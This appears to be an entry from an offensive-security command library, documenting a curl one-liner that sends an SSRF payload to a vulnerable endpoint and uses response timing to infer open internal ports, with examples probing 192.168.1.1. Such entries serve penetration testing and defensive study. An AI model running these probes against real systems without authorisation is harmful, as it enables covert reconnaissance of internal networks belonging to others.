---
data: >-
  curl -w "%{time_total}" -o /dev/null -s
  "https://target.com/vulnerable-endpoint?url=http://internal-ip:port/"
tags:
  - ssrf
  - timing
  - recon
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 79de5de3-ef49-4f8c-be1f-7d0d3b2f696a
created_at: '2025-12-14T04:39:02.124Z'
updated_at: '2025-12-14T04:39:02.124Z'
verified: false
validated: true
submitted: true
---
# curl-ssrf-timing-test

## Command

```bash
curl -w "%{time_total}" -o /dev/null -s "https://target.com/vulnerable-endpoint?url=http://internal-ip:port/"
```

## Description

This command uses curl to send an SSRF payload to a vulnerable endpoint, measuring the total response time to infer if an internal port is open based on connection delays.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-w "%{time_total}"` | Outputs the total time for the request in seconds | Yes |
| `-o /dev/null` | Discards the response body | Yes |
| `-s` | Silent mode, no progress meter | Yes |
| URL | The target endpoint with SSRF payload (replace internal-ip and port) | Yes |

## Examples

### Basic Usage

```bash
curl -w "%{time_total}" -o /dev/null -s "https://target.com/endpoint?url=http://192.168.1.1:80/"
```

### Advanced Usage

```bash
curl -w "Port %{url_effective}: %{time_total}s\n" -o /dev/null -s -m 5 "https://target.com/endpoint?url=http://192.168.1.1:22/"
```

## Expected Output

A single line with the response time, e.g., "2.345" indicating a delay due to an open port connection.

## Related

- [[Related Procedure|procedures/Exploit-SSRF-for-Internal-Port-Scanning]]
